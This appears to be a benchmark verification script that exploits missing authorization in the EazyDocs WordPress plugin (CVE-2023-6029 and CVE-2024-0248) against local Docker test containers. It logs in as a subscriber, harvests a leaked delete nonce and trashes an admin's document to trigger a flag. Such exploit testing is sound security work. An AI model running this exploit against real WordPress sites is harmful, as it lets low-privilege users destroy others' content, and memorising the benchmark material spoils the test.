#!/usr/bin/env bash
# =====================================================================
# PCBV2-0106 eazydocs-wordpress-plugin-cve-2024-0248
#   pair: CVE-2023-6029 -> CVE-2024-0248 (EazyDocs Doc_Delete missing authorization)
#   seed     (CVE-2023-6029): subscriber GET /wp-admin/index.php?Doc_Delete=yes&DeleteID=<id>
#            with NO nonce. V0 (2.3.5, no nonce/cap check) trashes admin's victim doc ->
#            mu-plugin pcb_flagcheck releases flag. V1 (2.3.9 wp_verify_nonce) blocks.
#   residual (CVE-2024-0248): same Doc_Delete on V1; per-doc delete nonce leaked to any
#            logged-in user via eazydocs_local_object.one_page_prompt_docs
#            (eazydocs_pro_doc_list, no capability gate). Subscriber harvests nonce under
#            their own session and still deletes. V2 (2.4.0 ezd_perform_edit_delete_actions)
#            requires delete_posts + author/manage_options.
#   效果通道 = admin-ajax pcb_flagcheck 响应 JSON（victim doc 被 trash 后才含 flag）
#   判定基准 = RUN_FLAG（提交值）：正常 seed 时 RUN_FLAG=平台真 flag；wrong/stale
#             检查时 RUN_FLAG=提交的 override（通道含真 flag≠override -> 10）。
#   退出码：0=效果发生 10=未发生 20=环境失败 30=参数错误
# =====================================================================
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR" 2>/dev/null || true

SVC="wp-$VERSION"
PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" 80 2>/dev/null | sed -E 's/^.*:([0-9]+)$/\1/' | tr -d '[:space:]')"
if [[ -z "$PORT" ]]; then
  case "$VERSION" in
    v0) PORT=39500;; v1) PORT=39501;; v2) PORT=39502;; *) PORT=39501;;
  esac
fi
[[ -n "$PORT" ]] || { echo "ERR: cannot resolve port for $VERSION" >&2; exit 20; }
export PCB_TARGET_PORT="$PORT"

# 就绪等待：wordpress 登录页 200（wp-entrypoint 完成 core+插件安装）
"$PY" - "$PORT" <<'PYEOF'
import sys, time, urllib.request
port = sys.argv[1]
for _ in range(150):
    try:
        with urllib.request.urlopen(f"http://127.0.0.1:{port}/wp-login.php", timeout=5) as r:
            if r.status == 200:
                sys.exit(0)
    except Exception:
        pass
    time.sleep(2)
sys.exit(1)
PYEOF
[[ $? -eq 0 ]] || { echo "ERR: wordpress $VERSION not ready on :$PORT" >&2; exit 20; }

if [[ "$MODE" == "--seed" ]]; then
  CAND="$("$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" 2>/dev/null || "$PY" "$CASE_DIR/poc/original_poc.py" 2>/dev/null)"
  CAND="${CAND:-"{}"}"
  # original_poc must emit JSON; wrap only as last-resort (never treat dict-repr as a path).
  CAND="$("$PY" -c "
import json, sys, ast
s = sys.argv[1]
try:
    json.loads(s)
    print(s)
    raise SystemExit
except Exception:
    pass
try:
    v = ast.literal_eval(s)
    if isinstance(v, dict):
        print(json.dumps(v))
        raise SystemExit
except Exception:
    pass
print(json.dumps({'path': s.strip(), 'to': s.strip(), 'payload': s.strip(), 'css': s.strip()}))
" "$CAND")"
else
  # residual：CVE-2024-0248 —— V1(2.3.9) 的 CVE-2023-6029 修复只加了 wp_verify_nonce(_wpnonce,DeleteID)
  # （CSRF 检查，非鉴权）；per-doc delete nonce 经 eazydocs_pro_doc_list() 泄漏给任何已登录用户
  # （eazydocs_local_object.one_page_prompt_docs，无 capability 门）。subscriber 收割本会话有效
  # nonce 后带 nonce 的 Doc_Delete 仍能越权 trash admin 的 victim doc -> pcb_flagcheck 释放 flag。
  CAND='{"probe_id": "cve-2024-0248-doc_delete-leaked-nonce", "technique": "leaked-nonce", "sink": "Doc_Delete"}'
fi
printf '%s' "$CAND" > "$WORK_DIR/cand.json"

# Probe is implemented here (seed_exec.py is a thin wrapper of the same sink). docker compose
# MUST use COMPOSE_PROJECT_NAME; hardcoded 39500/39501 would miss the randomized published port.
"$PY" - "$PORT" "$RUN_FLAG" "$COMPOSE_PROJECT_NAME" "$CASE_DIR" "$VERSION" "$MODE" "$WORK_DIR/cand.json" <<'PYEOF'
from __future__ import annotations
import json, os, re, subprocess, sys

port, flag, project, case_dir, version, mode, cand_path = sys.argv[1:8]
base = f"http://127.0.0.1:{port}"
service = f"wp-{version}"
ATTACKER, ATTACKER_PW = "subscriber", "subpass"

import requests  # noqa: E402

with open(cand_path) as f:
    candidate = json.load(f)
tech = candidate.get("technique") if isinstance(candidate, dict) else str(candidate)


def wp_eval(php: str) -> str:
    r = subprocess.run(
        ["docker", "compose", "-p", project, "--project-directory", case_dir,
         "exec", "-T", service, "wp", "eval", php, "--allow-root", "--path=/var/www/html"],
        text=True, capture_output=True, check=False)
    if r.returncode != 0:
        raise RuntimeError(f"wp eval rc={r.returncode}: {(r.stderr or r.stdout or '')[:400]}")
    return r.stdout


def reset_victim_doc() -> int:
    out = wp_eval(
        '$aid=(int)get_user_by("login","admin")->ID;'
        '$vid=wp_insert_post(array("post_type"=>"docs","post_title"=>"PCB Victim Confidential Doc",'
        '"post_status"=>"publish","post_author"=>$aid,"post_parent"=>0),true);'
        'if(is_wp_error($vid)){fwrite(STDERR,$vid->get_error_message());exit(1);} '
        'update_option("pcb_victim_doc",(int)$vid); echo (int)$vid;')
    m = re.search(r"\d+", out)
    if not m:
        raise RuntimeError(f"victim doc id missing: {out[:200]!r}")
    return int(m.group())


def login(user: str, pw: str) -> requests.Session:
    s = requests.Session()
    s.get(f"{base}/wp-login.php", timeout=15)
    s.cookies.set("wordpress_test_cookie", "WP Cookie check")
    s.post(f"{base}/wp-login.php",
           data={"log": user, "pwd": pw, "wp-submit": "Log In",
                 "redirect_to": f"{base}/wp-admin/", "testcookie": "1"},
           timeout=15, allow_redirects=True)
    if not any(c.name.startswith("wordpress_logged_in") for c in s.cookies):
        raise RuntimeError(f"login failed for {user}")
    return s


def harvest_nonce(sess: requests.Session, doc_id: int) -> str | None:
    for page in ("/wp-admin/index.php", "/wp-admin/profile.php"):
        r = sess.get(f"{base}{page}", timeout=20)
        txt = (r.text.replace('\\"', '"').replace('\\/', '/')
               .replace('\\u003c', '<').replace('\\u003e', '>')
               .replace('\\u0022', '"').replace('&quot;', '"'))
        for m in re.finditer(r'_wpnonce="([a-f0-9]+)"\s+value="(\d+)"', txt):
            if int(m.group(2)) == int(doc_id):
                return m.group(1)
        for m in re.finditer(r'value="(\d+)"[^>]*_wpnonce="([a-f0-9]+)"', txt):
            if int(m.group(1)) == int(doc_id):
                return m.group(2)
    return None


def doc_delete(sess: requests.Session, doc_id: int, nonce: str | None) -> int:
    params = {"Doc_Delete": "yes", "DeleteID": str(doc_id)}
    if nonce:
        params["_wpnonce"] = nonce
    r = sess.get(f"{base}/wp-admin/index.php", params=params, timeout=20, allow_redirects=False)
    return r.status_code


def flagcheck() -> dict:
    r = requests.get(f"{base}/wp-admin/admin-ajax.php",
                     params={"action": "pcb_flagcheck"}, timeout=20)
    try:
        body = r.json()
    except Exception:
        body = {"_raw": r.text[:300]}
    return {"status": r.status_code, "body": body}


result = {"version": version, "mode": mode, "technique": tech}
try:
    doc_id = reset_victim_doc()
    result["victim_doc"] = doc_id
    s = login(ATTACKER, ATTACKER_PW)
    nonce = None
    if tech == "leaked-nonce":
        nonce = harvest_nonce(s, doc_id)
        result["harvested_nonce"] = bool(nonce)
    result["delete_status"] = doc_delete(s, doc_id, nonce)
    result["flagcheck"] = flagcheck()
except Exception as e:  # noqa: BLE001
    result["error"] = f"{type(e).__name__}: {e}"

out = json.dumps(result, default=str)
print(f"[verify {mode}] version={version} technique={tech}")
print(out[:800])
body = json.dumps(result.get("flagcheck", {}).get("body", result), default=str)
if "error" in result and flag not in body:
    print(result["error"][:400], file=sys.stderr)
    sys.exit(20)
sys.exit(0 if flag in body else 10)
PYEOF
RC=$?
echo "verify[$MODE] version=$VERSION rc=$RC (judge_flag=$RUN_FLAG)" >&2
exit "$RC"
